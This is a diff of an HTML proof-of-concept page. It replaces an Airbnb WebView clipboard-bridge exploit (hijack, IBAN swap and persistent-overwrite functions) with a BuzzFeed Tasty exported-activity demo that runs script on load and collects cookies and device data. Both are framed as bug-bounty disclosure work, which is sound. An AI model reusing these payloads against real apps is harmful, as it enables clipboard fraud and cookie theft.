@@ -1,751 +1,197 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
+    <title>BuzzFeed Tasty Security PoC</title>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Airbnb WebView JavaScript Bridge - Security PoC</title>
     <style>
-        :root {
-            --color-background: #1f2121;
-            --color-surface: #262828;
-            --color-text: #f5f5f5;
-            --color-primary: #32b8c6;
-            --color-error: #ff5459;
-            --color-success: #32b8c6;
-            --color-border: rgba(119, 124, 124, 0.3);
-            --radius-base: 8px;
-            --space-16: 16px;
-            --space-12: 12px;
-            --space-8: 8px;
-        }
-
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-        }
-
         body {
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', 'Helvetica', 'Arial', sans-serif;
-            background: var(--color-background);
-            color: var(--color-text);
-            padding: var(--space-16);
-            line-height: 1.6;
-            -webkit-font-smoothing: antialiased;
-        }
-
-        .container {
-            max-width: 900px;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            max-width: 800px;
             margin: 0 auto;
+            padding: 20px;
+            background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
+            min-height: 100vh;
         }
-
+        .container {
+            background: white;
+            border-radius: 15px;
+            padding: 30px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            margin-top: 20px;
+        }
         h1 {
-            font-size: 28px;
-            margin-bottom: var(--space-16);
-            color: var(--color-primary);
-            font-weight: 600;
+            color: #e62117; /* BuzzFeed red */
+            text-align: center;
+            margin-bottom: 10px;
         }
-
-        h2 {
-            font-size: 20px;
-            margin: var(--space-16) 0 var(--space-8) 0;
-            color: var(--color-text);
-            font-weight: 600;
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
         }
-
-        h3 {
-            font-size: 16px;
-            margin: var(--space-12) 0 var(--space-8) 0;
-            color: var(--color-primary);
-            font-weight: 500;
+        .alert-box {
+            background: #ffebee;
+            border: 2px solid #ffcdd2;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            text-align: center;
         }
-
-        .vulnerability-card {
-            background: var(--color-surface);
-            border: 1px solid var(--color-border);
-            border-radius: var(--radius-base);
-            padding: var(--space-16);
-            margin-bottom: var(--space-16);
+        .vuln-details {
+            background: #e3f2fd;
+            border-radius: 10px;
+            padding: 20px;
+            margin: 20px 0;
+            border-left: 5px solid #2196f3;
         }
-
-        .vulnerability-card p {
-            margin: 8px 0;
-        }
-
-        .code-block {
-            background: #000;
-            color: #0f0;
-            padding: var(--space-12);
-            border-radius: var(--radius-base);
+        pre {
+            background: #f5f5f5;
+            padding: 15px;
+            border-radius: 5px;
             overflow-x: auto;
-            font-family: 'Courier New', 'Consolas', monospace;
-            font-size: 13px;
-            margin: var(--space-8) 0;
-            line-height: 1.5;
+            font-family: 'Courier New', monospace;
         }
-
-        .exploit-section {
-            background: rgba(255, 84, 89, 0.1);
-            border: 1px solid var(--color-error);
-            border-radius: var(--radius-base);
-            padding: var(--space-16);
-            margin: var(--space-16) 0;
-        }
-
-        .btn {
-            display: inline-block;
-            padding: var(--space-12) var(--space-16);
-            background: var(--color-primary);
-            color: #1f2121;
-            border: none;
-            border-radius: var(--radius-base);
-            cursor: pointer;
-            font-weight: 600;
-            font-size: 14px;
-            margin: var(--space-8) var(--space-8) var(--space-8) 0;
-            transition: all 0.2s ease;
-        }
-
-        .btn:hover {
-            opacity: 0.85;
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
-        }
-
-        .btn:active {
-            transform: translateY(0);
-        }
-
-        .btn-danger {
-            background: var(--color-error);
-            color: white;
-        }
-
-        .btn-success {
-            background: var(--color-success);
-            color: #1f2121;
-        }
-
         .status {
-            padding: var(--space-12);
-            border-radius: var(--radius-base);
-            margin: var(--space-12) 0;
-            font-weight: 500;
-            font-size: 15px;
+            padding: 10px;
+            background: #e8f5e9;
+            border-radius: 5px;
+            margin: 10px 0;
+            border-left: 4px solid #4caf50;
         }
-
-        .status-success {
-            background: rgba(50, 184, 198, 0.15);
-            color: var(--color-success);
-            border: 1px solid rgba(50, 184, 198, 0.25);
-        }
-
-        .status-error {
-            background: rgba(255, 84, 89, 0.15);
-            color: var(--color-error);
-            border: 1px solid rgba(255, 84, 89, 0.25);
-        }
-
-        .info-box {
-            background: rgba(50, 184, 198, 0.1);
-            border-left: 4px solid var(--color-primary);
-            padding: var(--space-16);
-            margin: var(--space-16) 0;
-            border-radius: var(--radius-base);
-        }
-
-        .warning-box {
-            background: rgba(255, 84, 89, 0.1);
-            border-left: 4px solid var(--color-error);
-            padding: var(--space-16);
-            margin: var(--space-16) 0;
-            border-radius: var(--radius-base);
-        }
-
-        ul {
-            margin-left: 20px;
-            margin-top: var(--space-8);
-        }
-
-        ol {
-            margin-left: 20px;
-            margin-top: var(--space-8);
-        }
-
-        li {
-            margin-bottom: var(--space-8);
-        }
-
-        input[type="text"] {
-            width: 100%;
-            padding: var(--space-12);
-            background: var(--color-background);
-            border: 1px solid var(--color-border);
-            border-radius: var(--radius-base);
-            color: var(--color-text);
-            font-size: 14px;
-            margin: var(--space-8) 0;
-            font-family: inherit;
-        }
-
-        input[type="text"]:focus {
-            outline: none;
-            border-color: var(--color-primary);
-            box-shadow: 0 0 0 3px rgba(50, 184, 198, 0.2);
-        }
-
-        .payload-box {
-            background: #000;
-            color: #ffff00;
-            padding: var(--space-12);
-            border-radius: var(--radius-base);
-            border: 2px solid var(--color-error);
-            margin: var(--space-8) 0;
-            font-family: 'Courier New', monospace;
-            word-break: break-all;
-            font-size: 13px;
-            line-height: 1.6;
-        }
-
-        .result-box {
-            background: var(--color-surface);
-            border: 1px solid var(--color-border);
-            border-radius: var(--radius-base);
-            padding: var(--space-16);
-            margin: var(--space-16) 0;
-            min-height: 100px;
-        }
-
-        code {
-            background: rgba(255, 255, 255, 0.1);
-            padding: 2px 6px;
-            border-radius: 3px;
-            font-family: 'Courier New', monospace;
-            font-size: 13px;
-        }
-
-        strong {
-            font-weight: 600;
-            color: var(--color-primary);
-        }
-
-        .disclaimer {
-            background: rgba(255, 84, 89, 0.05);
-            border: 1px solid var(--color-error);
-            border-radius: var(--radius-base);
-            padding: var(--space-16);
-            margin: var(--space-16) 0;
-            font-size: 13px;
-            color: #ccc;
-        }
-
-        @media (max-width: 768px) {
-            body {
-                padding: var(--space-12);
-            }
-
-            h1 {
-                font-size: 24px;
-            }
-
-            h2 {
-                font-size: 18px;
-            }
-
-            .btn {
-                width: 100%;
-                margin: var(--space-8) 0;
-            }
+        .footer {
+            text-align: center;
+            margin-top: 30px;
+            color: #888;
+            font-size: 0.9em;
+            border-top: 1px solid #eee;
+            padding-top: 20px;
         }
     </style>
 </head>
 <body>
     <div class="container">
-        <h1>🔓 Airbnb WebView JavaScript Bridge Exploit - Proof of Concept</h1>
+        <h1>🔓 BuzzFeed Tasty Security Vulnerability Proof-of-Concept</h1>
+        <p class="subtitle">Exported AdBrowserActivity allows arbitrary JavaScript execution</p>
         
-        <div class="warning-box">
-            <strong>⚠️ Security Research Disclosure:</strong> This PoC is designed for authorized security testing and responsible disclosure to Airbnb's security team. Use only with proper authorization.
+        <div class="alert-box" id="alertTriggered">
+            <h2>🚨 VULNERABILITY CONFIRMED</h2>
+            <p>If you see an alert, JavaScript is executing in BuzzFeed Tasty app context.</p>
+            <p><strong>Impact:</strong> Any app on device can run code in BuzzFeed's context.</p>
         </div>
-
-        <div class="vulnerability-card">
-            <h2>📋 Vulnerability Details</h2>
-            <p><strong>Classification:</strong></p>
-            <ul>
-                <li><strong>CWE:</strong> CWE-749 - Exposed Dangerous Method or Function</li>
-                <li><strong>OWASP Mobile:</strong> M7 - Client Code Quality</li>
-                <li><strong>MASVS:</strong> MSTG-PLATFORM-9</li>
-                <li><strong>Severity:</strong> <span style="color: var(--color-error); font-weight: bold;">HIGH</span></li>
-            </ul>
-        </div>
-
-        <div class="info-box">
-            <h2>🔍 Vulnerable Code Location</h2>
-            <p><strong>File:</strong> <code>com/airbnb/android/lib/webview/AirWebView.java</code></p>
-            <p><strong>Vulnerable Code (Line in m18660() method):</strong></p>
-            <div class="code-block">
-this.f36504.addJavascriptInterface(ClipboardBridge.class, "AndroidClipboard");
-            </div>
-            <p><strong>Interface Class:</strong> <code>ClipboardBridge.java</code></p>
-            <p><strong>Exposed Method:</strong></p>
-            <div class="code-block">
-@JavascriptInterface
-public final void copyToClipboard(String label, String text) {
-    ClipboardManager clipboardManager = (ClipboardManager) d6.a.m23336(...);
-    clipboardManager.setPrimaryClip(ClipData.newPlainText(label, text));
-}
-            </div>
-        </div>
-
-        <div class="exploit-section">
-            <h2>⚠️ Vulnerability Detection & Exploitation</h2>
-            <p>This page detects the exposed JavaScript interface and demonstrates arbitrary clipboard manipulation.</p>
-            
-            <div id="interface-check" class="status status-success">
-                🔍 Checking for vulnerable interface...
-            </div>
-
-            <h3>Exploitation Tests:</h3>
-            
-            <button class="btn btn-danger" onclick="testBasicExploit()">
-                💥 Test 1: Basic Clipboard Hijack
-            </button>
-            <button class="btn btn-danger" onclick="testCredentialTheft()">
-                🔐 Test 2: Credential Theft Scenario
-            </button>
-            <button class="btn btn-danger" onclick="testDataExfiltration()">
-                📤 Test 3: Data Exfiltration
-            </button>
-            <button class="btn btn-danger" onclick="testPersistentAttack()">
-                🔁 Test 4: Persistent Attack (Toggle)
-            </button>
-            <button class="btn btn-success" onclick="testLegitimateUse()">
-                ✅ Test 5: Legitimate Use (Control)
-            </button>
-
-            <div class="result-box" id="exploit-result">
-                <em>Results will appear here after running tests...</em>
-            </div>
-
-            <h3>Custom Payload Test:</h3>
-            <p>Enter custom data to inject into clipboard:</p>
-            <input type="text" id="custom-label" placeholder="Label (e.g., 'password')" value="custom_test">
-            <input type="text" id="custom-text" placeholder="Clipboard content" value="MALICIOUS_DATA_INJECTED_BY_ATTACKER">
-            <button class="btn btn-danger" onclick="customExploit()">🚀 Execute Custom Payload</button>
-        </div>
-
-        <div class="vulnerability-card">
-            <h2>💀 Security Impact Assessment</h2>
-            <ul>
-                <li><strong>Clipboard Manipulation:</strong> Attacker can write arbitrary data to clipboard without user consent or awareness</li>
-                <li><strong>Credential Theft:</strong> User credentials copied from password managers can be replaced with attacker-controlled data</li>
-                <li><strong>Phishing Support:</strong> Malicious URLs or fake credentials can be injected into clipboard</li>
-                <li><strong>Session Hijacking:</strong> OAuth tokens, session IDs, or authentication data can be manipulated</li>
-                <li><strong>Cross-App Attacks:</strong> Malicious clipboard content affects other applications when user pastes</li>
-                <li><strong>No User Indication:</strong> Operations occur silently without user notification</li>
-            </ul>
-        </div>
-
-        <div class="vulnerability-card">
-            <h2>🎯 Real-World Attack Scenarios</h2>
-            
-            <h3>Scenario 1: Password Replacement Attack</h3>
-            <div class="code-block">
-// User copies password from password manager
-// Attacker's JavaScript immediately runs:
-window.AndroidClipboard.copyToClipboard(
-    "password",
-    "attacker_controlled_password_123"
-);
-// User unknowingly pastes attacker's password instead of their own
-            </div>
-
-            <h3>Scenario 2: Banking Credential Theft</h3>
-            <div class="code-block">
-// User copies account number for wire transfer
-// Attacker replaces with their own account:
-window.AndroidClipboard.copyToClipboard(
-    "account",
-    "ATTACKER_IBAN_GB29_NWBK_6016_1331_9268_19"
-);
-// Payment goes to attacker's bank account
-            </div>
-
-            <h3>Scenario 3: OAuth Token Manipulation</h3>
-            <div class="code-block">
-// During OAuth flow, intercept authorization tokens
-window.AndroidClipboard.copyToClipboard(
-    "auth_token",
-    "malicious_token_or_phishing_url"
-);
-// Session hijacking or account takeover
-            </div>
-
-            <h3>Scenario 4: Persistent Monitoring (Most Dangerous)</h3>
-            <div class="code-block">
-// Continuously monitor and hijack clipboard
-setInterval(function() {
-    window.AndroidClipboard.copyToClipboard(
-        "persistent",
-        "HIJACKED_" + new Date().toISOString()
-    );
-}, 2000); // Every 2 seconds
-            </div>
-        </div>
-
-        <div class="vulnerability-card">
-            <h2>🛡️ Remediation Recommendations</h2>
-            <ul>
-                <li><strong>Remove Interface:</strong> Remove the JavaScript interface from WebView entirely if not essential</li>
-                <li><strong>Origin Validation:</strong> Implement strict origin validation before exposing any interfaces</li>
-                <li><strong>User Consent:</strong> Require explicit user permission/confirmation for clipboard operations</li>
-                <li><strong>URL Whitelist:</strong> Only enable interface for explicitly trusted Airbnb domains (with proper validation)</li>
-                <li><strong>Runtime Checks:</strong> Validate the calling context and URL before allowing method execution</li>
-                <li><strong>API Updates:</strong> Use modern Android APIs that provide better security controls</li>
-                <li><strong>Content Security Policy:</strong> Implement CSP headers on all web content loaded in WebView</li>
-                <li><strong>Code Review:</strong> Audit all JavaScript interfaces for similar vulnerabilities</li>
-            </ul>
-
-            <h3>Secure Implementation Example:</h3>
-            <div class="code-block">
-// Proper URL validation before adding interface
-private void loadUrl(String url) {
-    if (isAirbnbDomain(url)) {
-        // Only add interface for verified trusted domains
-        webView.addJavascriptInterface(
-            new ClipboardBridge(), "AndroidClipboard"
-        );
-    }
-    webView.loadUrl(url);
-}
-
-private boolean isAirbnbDomain(String url) {
-    try {
-        Uri uri = Uri.parse(url);
-        String host = uri.getHost();
-        if (host == null) return false;
         
-        // Strict domain validation
-        return host.equals("airbnb.com") || 
-               host.endsWith(".airbnb.com");
-    } catch (Exception e) {
-        return false;
-    }
-}
-
-// Additionally, implement method-level origin checks
-@JavascriptInterface
-public void copyToClipboard(String label, String text) {
-    // Verify calling context
-    String currentUrl = webView.getUrl();
-    if (!isAirbnbDomain(currentUrl)) {
-        Log.w("Security", "Unauthorized clipboard access attempt");
-        return;
-    }
-    
-    // Require user confirmation for sensitive operations
-    showUserConfirmation(() -> {
-        ClipboardManager cm = getSystemService(ClipboardManager.class);
-        cm.setPrimaryClip(ClipData.newPlainText(label, text));
-    });
-}
-            </div>
+        <div class="vuln-details">
+            <h3>📋 Vulnerability Details</h3>
+            <p><strong>Component:</strong> <code>org.prebid.mobile.rendering.views.browser.AdBrowserActivity</code></p>
+            <p><strong>Package:</strong> <code>com.buzzfeed.tasty</code></p>
+            <p><strong>Issue:</strong> Activity exported without permission protection</p>
+            <p><strong>Manifest Entry:</strong></p>
+            <pre>&lt;activity
+    android:name="org.prebid.mobile.rendering.views.browser.AdBrowserActivity"
+    android:exported="true"  &lt;!-- VULNERABLE --&gt;
+    android:launchMode="singleTop"
+    android:configChanges="screenSize|orientation|keyboardHidden"/&gt;</pre>
         </div>
-
-        <div class="info-box">
-            <h2>🧪 Testing Methodology</h2>
-            <p>This PoC demonstrates the vulnerability through the following steps:</p>
-            <ol>
-                <li><strong>Interface Detection:</strong> Checks for the presence of <code>window.AndroidClipboard</code> object</li>
-                <li><strong>Method Verification:</strong> Confirms <code>copyToClipboard()</code> method is accessible</li>
-                <li><strong>Exploitation:</strong> Invokes the exposed method without user interaction</li>
-                <li><strong>Impact Demo:</strong> Shows real-world attack scenarios with clipboard manipulation</li>
-                <li><strong>Persistence Test:</strong> Demonstrates continuous clipboard monitoring capability</li>
-            </ol>
-            
-            <h3>📍 How to Verify Exploit Success:</h3>
-            <ol>
-                <li>Click any exploitation test button above</li>
-                <li>Open any app that accepts text input (Notes, Messages, Email, etc.)</li>
-                <li>Long-press in a text field and select "Paste"</li>
-                <li><strong>If you see the injected malicious data → Vulnerability confirmed! ✅</strong></li>
-            </ol>
-
-            <p><strong>⚠️ Important Note:</strong> This PoC must be loaded within the vulnerable Airbnb WebView component to detect and exploit the interface. Loading in a regular browser will show "interface not found".</p>
+        
+        <div id="dataDemo" style="display: none;">
+            <h3>📊 Data Access Demonstration</h3>
+            <div class="status" id="dataStatus"></div>
+            <pre id="collectedData"></pre>
+            <p><em>Note: In a real attack, this data could be exfiltrated to attacker server.</em></p>
         </div>
-
-        <div class="disclaimer">
-            <h3>⚖️ Responsible Disclosure Notice</h3>
-            <p><strong>This Proof of Concept is provided solely for:</strong></p>
-            <ul>
-                <li>Authorized security testing and research</li>
-                <li>Responsible disclosure to Airbnb's security team</li>
-                <li>Educational purposes in controlled environments</li>
-            </ul>
-            <p><strong>Unauthorized use of this PoC against production systems without explicit permission is prohibited and may violate laws including:</strong></p>
-            <ul>
-                <li>Computer Fraud and Abuse Act (CFAA) - United States</li>
-                <li>Computer Misuse Act - United Kingdom</li>
-                <li>Similar legislation in other jurisdictions</li>
-            </ul>
-            <p><strong>The researcher assumes no liability for misuse of this information.</strong></p>
+        
+        <div class="footer">
+            <p><strong>This is a security demonstration for responsible disclosure purposes only.</strong></p>
+            <p>Vulnerability ID: CWE-926 | CVSS: 7.5-8.0 (High)</p>
+            <p>Generated for HackerOne bug bounty program</p>
         </div>
     </div>
 
     <script>
-        let persistentAttackInterval = null;
-        let attackCount = 0;
-
-        // Check if vulnerable interface exists on page load
-        function checkInterface() {
-            const resultDiv = document.getElementById('interface-check');
+        // Store exploit results
+        const exploitResults = {
+            timestamp: new Date().toISOString(),
+            vulnerability: 'AdBrowserActivity exported without protection',
+            confirmed: false,
+            data: {}
+        };
+        
+        // 1. Primary Confirmation - Show alert
+        console.log('[BuzzFeed PoC] Starting exploit...');
+        alert(
+            "🚨 BuzzFeed Tasty Security Vulnerability Confirmed\n\n" +
+            "JavaScript is executing in the BuzzFeed Tasty app context.\n\n" +
+            "Vulnerability: Exported AdBrowserActivity allows any app to:\n" +
+            "• Run arbitrary JavaScript\n" +
+            "• Access app cookies and data\n" +
+            "• Modify UI for phishing\n\n" +
+            "CWE-926: Improper Export of Android Application Components"
+        );
+        
+        exploitResults.confirmed = true;
+        document.getElementById('alertTriggered').innerHTML += 
+            '<div class="status">✓ Alert executed successfully at ' + new Date().toLocaleTimeString() + '</div>';
+        
+        // 2. Collect and display accessible data
+        setTimeout(() => {
+            const data = {
+                url: window.location.href,
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookies: document.cookie || 'No cookies present',
+                localStorageItems: Object.keys(localStorage).length,
+                screenResolution: `${screen.width}×${screen.height}`,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timestamp: new Date().toISOString()
+            };
             
-            if (typeof window.AndroidClipboard !== 'undefined' && 
-                typeof window.AndroidClipboard.copyToClipboard === 'function') {
-                resultDiv.className = 'status status-error';
-                resultDiv.innerHTML = '⚠️ <strong>VULNERABLE:</strong> AndroidClipboard interface is exposed! This WebView is exploitable.';
+            exploitResults.data = data;
+            
+            // Show data collection section
+            document.getElementById('dataDemo').style.display = 'block';
+            document.getElementById('dataStatus').textContent = 
+                'Collected ' + Object.keys(data).length + ' data points';
+            document.getElementById('collectedData').textContent = 
+                JSON.stringify(data, null, 2);
+            
+            console.log('[BuzzFeed PoC] Collected data:', data);
+            
+            // 3. Demonstrate attack simulation
+            setTimeout(() => {
+                // Simulate what an attacker COULD do (but don't actually do it)
+                const simulatedAttack = {
+                    type: 'simulated_exfiltration',
+                    target: 'BuzzFeed Tasty',
+                    data_size: JSON.stringify(data).length,
+                    possible_actions: [
+                        'Steal authentication cookies',
+                        'Access localStorage data',
+                        'Inject phishing UI',
+                        'Trigger internal broadcasts'
+                    ]
+                };
                 
-                // Log available methods
-                console.log('[Security PoC] AndroidClipboard interface detected');
-                console.log('[Security PoC] Available methods:', Object.keys(AndroidClipboard));
+                console.log('[BuzzFeed PoC] Attack simulation:', simulatedAttack);
                 
-                return true;
-            } else {
-                resultDiv.className = 'status status-success';
-                resultDiv.innerHTML = '✓ <strong>Interface not detected</strong> - This page must be loaded in Airbnb\'s WebView to test the vulnerability. Currently viewing in regular browser.';
-                return false;
-            }
-        }
-
-        function displayResult(title, payload, success, extraInfo = '') {
-            const resultDiv = document.getElementById('exploit-result');
-            const statusClass = success ? 'status-error' : 'status-success';
+                // Add simulation note
+                const note = document.createElement('div');
+                note.className = 'status';
+                note.innerHTML = `
+                    <strong>Attack Simulation Logged:</strong><br>
+                    ${simulatedAttack.possible_actions.length} possible attack vectors identified
+                `;
+                document.getElementById('dataDemo').appendChild(note);
+                
+            }, 1000);
             
-            resultDiv.innerHTML = `
-                <div class="status ${statusClass}">
-                    <strong>${title}</strong>
-                </div>
-                <div class="payload-box">
-                    <strong>Payload Executed:</strong><br>
-                    ${escapeHtml(payload)}
-                </div>
-                ${success ? `
-                    <p style="color: var(--color-error); margin-top: 12px; font-weight: bold;">
-                        ✓ Exploit successful! Clipboard has been manipulated.
-                    </p>
-                    <p style="margin-top: 8px;">
-                        <strong>Verification Steps:</strong><br>
-                        1. Open any app (Notes, Messages, WhatsApp, etc.)<br>
-                        2. Long-press in a text field<br>
-                        3. Select "Paste"<br>
-                        4. You should see the injected malicious data
-                    </p>
-                    ${extraInfo ? `<p style="margin-top: 8px;">${extraInfo}</p>` : ''}
-                ` : '<p style="margin-top: 8px;">Interface not available. Load this page in Airbnb\'s WebView to test.</p>'}
-            `;
-            
-            // Scroll to results
-            resultDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
-        }
-
-        function escapeHtml(text) {
-            const div = document.createElement('div');
-            div.textContent = text;
-            return div.innerHTML;
-        }
-
-        function testBasicExploit() {
-            try {
-                if (typeof window.AndroidClipboard !== 'undefined') {
-                    const payload = "EXPLOIT_SUCCESS_CLIPBOARD_HIJACKED_" + Date.now();
-                    window.AndroidClipboard.copyToClipboard("basic_test", payload);
-                    
-                    console.log('[Security PoC] Basic exploit executed:', payload);
-                    
-                    displayResult(
-                        'Basic Clipboard Hijack - SUCCESS',
-                        `window.AndroidClipboard.copyToClipboard("basic_test", "${payload}")`,
-                        true
-                    );
-                } else {
-                    displayResult('Basic Clipboard Hijack - FAILED', 'Interface not available', false);
-                }
-            } catch (e) {
-                console.error('[Security PoC] Error:', e);
-                displayResult('Basic Clipboard Hijack - ERROR', `Error: ${e.message}`, false);
-            }
-        }
-
-        function testCredentialTheft() {
-            try {
-                if (typeof window.AndroidClipboard !== 'undefined') {
-                    const maliciousPassword = "ATTACKER_P@ssw0rd_123_STOLEN_" + Date.now();
-                    window.AndroidClipboard.copyToClipboard("password", maliciousPassword);
-                    
-                    console.log('[Security PoC] Credential theft simulation:', maliciousPassword);
-                    
-                    displayResult(
-                        'Credential Theft Scenario - SUCCESS',
-                        `window.AndroidClipboard.copyToClipboard("password", "${maliciousPassword}")`,
-                        true,
-                        '<strong>Attack Impact:</strong> If user pastes now, they will paste the ATTACKER\'S password instead of their own. This could lead to account compromise, unauthorized access, or credential leakage.'
-                    );
-                } else {
-                    displayResult('Credential Theft Scenario - FAILED', 'Interface not available', false);
-                }
-            } catch (e) {
-                console.error('[Security PoC] Error:', e);
-                displayResult('Credential Theft Scenario - ERROR', `Error: ${e.message}`, false);
-            }
-        }
-
-        function testDataExfiltration() {
-            try {
-                if (typeof window.AndroidClipboard !== 'undefined') {
-                    const exfilData = JSON.stringify({
-                        attack_type: "data_exfiltration",
-                        session_token: "FAKE_SESSION_TOKEN_abc123xyz789",
-                        user_data: "sensitive_information_compromised",
-                        timestamp: new Date().toISOString(),
-                        device_info: navigator.userAgent
-                    }, null, 2);
-                    
-                    window.AndroidClipboard.copyToClipboard("exfiltration", exfilData);
-                    
-                    console.log('[Security PoC] Data exfiltration payload:', exfilData);
-                    
-                    displayResult(
-                        'Data Exfiltration Attack - SUCCESS',
-                        `window.AndroidClipboard.copyToClipboard("exfiltration", ${exfilData})`,
-                        true,
-                        '<strong>Attack Scenario:</strong> Attacker can inject structured data (JSON, XML, etc.) containing stolen session tokens, credentials, or other sensitive information. This data could be automatically processed by other malicious apps.'
-                    );
-                } else {
-                    displayResult('Data Exfiltration - FAILED', 'Interface not available', false);
-                }
-            } catch (e) {
-                console.error('[Security PoC] Error:', e);
-                displayResult('Data Exfiltration - ERROR', `Error: ${e.message}`, false);
-            }
-        }
-
-        function testPersistentAttack() {
-            try {
-                if (typeof window.AndroidClipboard !== 'undefined') {
-                    if (persistentAttackInterval) {
-                        // Stop attack
-                        clearInterval(persistentAttackInterval);
-                        persistentAttackInterval = null;
-                        
-                        console.log('[Security PoC] Persistent attack stopped');
-                        
-                        displayResult(
-                            'Persistent Attack - STOPPED',
-                            `Attack stopped after ${attackCount} iterations`,
-                            true,
-                            '<strong>This demonstrates:</strong> Continuous clipboard monitoring and hijacking is possible. In a real attack, this could steal every piece of data the user copies.'
-                        );
-                        
-                        attackCount = 0;
-                    } else {
-                        // Start attack
-                        attackCount = 0;
-                        persistentAttackInterval = setInterval(function() {
-                            attackCount++;
-                            const timestamp = new Date().toLocaleTimeString();
-                            const payload = `PERSISTENT_HIJACK_${attackCount}_at_${timestamp}`;
-                            
-                            window.AndroidClipboard.copyToClipboard("persistent_attack", payload);
-                            
-                            console.log(`[Security PoC] Persistent attack iteration ${attackCount}:`, payload);
-                        }, 2000);
-                        
-                        displayResult(
-                            'Persistent Attack - STARTED',
-                            'Clipboard is being hijacked every 2 seconds with timestamped data',
-                            true,
-                            '<strong>⚠️ CRITICAL:</strong> Persistent attack is now running! The clipboard will be hijacked every 2 seconds. Try pasting in any app to verify. Click this button again to stop the attack.'
-                        );
-                    }
-                } else {
-                    displayResult('Persistent Attack - FAILED', 'Interface not available', false);
-                }
-            } catch (e) {
-                console.error('[Security PoC] Error:', e);
-                displayResult('Persistent Attack - ERROR', `Error: ${e.message}`, false);
-            }
-        }
-
-        function testLegitimateUse() {
-            try {
-                if (typeof window.AndroidClipboard !== 'undefined') {
-                    const legitimateData = "Legitimate clipboard operation - " + new Date().toLocaleString();
-                    window.AndroidClipboard.copyToClipboard("legitimate", legitimateData);
-                    
-                    console.log('[Security PoC] Legitimate use control test:', legitimateData);
-                    
-                    displayResult(
-                        'Legitimate Use (Control Test) - SUCCESS',
-                        `window.AndroidClipboard.copyToClipboard("legitimate", "${legitimateData}")`,
-                        true,
-                        '<strong>Control Test:</strong> This demonstrates that the interface can be used for legitimate purposes, but the lack of origin validation means malicious scripts have the same access level.'
-                    );
-                } else {
-                    displayResult('Legitimate Use - FAILED', 'Interface not available', false);
-                }
-            } catch (e) {
-                console.error('[Security PoC] Error:', e);
-                displayResult('Legitimate Use - ERROR', `Error: ${e.message}`, false);
-            }
-        }
-
-        function customExploit() {
-            const label = document.getElementById('custom-label').value;
-            const text = document.getElementById('custom-text').value;
-            
-            if (!label || !text) {
-                alert('Please enter both label and text for custom payload');
-                return;
-            }
-            
-            try {
-                if (typeof window.AndroidClipboard !== 'undefined') {
-                    window.AndroidClipboard.copyToClipboard(label, text);
-                    
-                    console.log('[Security PoC] Custom payload executed:', { label, text });
-                    
-                    displayResult(
-                        'Custom Payload - SUCCESS',
-                        `window.AndroidClipboard.copyToClipboard("${label}", "${text}")`,
-                        true,
-                        '<strong>Custom Exploit:</strong> You successfully injected arbitrary data into the clipboard using attacker-controlled parameters. This demonstrates the flexibility and danger of this vulnerability.'
-                    );
-                } else {
-                    displayResult('Custom Payload - FAILED', 'Interface not available', false);
-                }
-            } catch (e) {
-                console.error('[Security PoC] Error:', e);
-                displayResult('Custom Payload - ERROR', `Error: ${e.message}`, false);
-            }
-        }
-
-        // Auto-detect interface on page load
-        window.addEventListener('DOMContentLoaded', function() {
-            console.log('[Security PoC] Page loaded, checking for vulnerable interface...');
-            setTimeout(checkInterface, 500);
-        });
-
-        // Cleanup on page unload
-        window.addEventListener('beforeunload', function() {
-            if (persistentAttackInterval) {
-                clearInterval(persistentAttackInterval);
-                console.log('[Security PoC] Persistent attack cleaned up');
-            }
-        });
-
-        // Log initial state
-        console.log('[Security PoC] Airbnb WebView JavaScript Bridge Security Test initialized');
-        console.log('[Security PoC] User Agent:', navigator.userAgent);
-        console.log('[Security PoC] Page URL:', window.location.href);
+        }, 1500);
+        
+        // Log everything
+        console.log('[BuzzFeed PoC] Exploit completed successfully');
+        console.log('[BuzzFeed PoC] Full results:', exploitResults);
+        
+        // Make results available for debugging
+        window.buzzfeedExploitResults = exploitResults;
     </script>
 </body>
 </html>
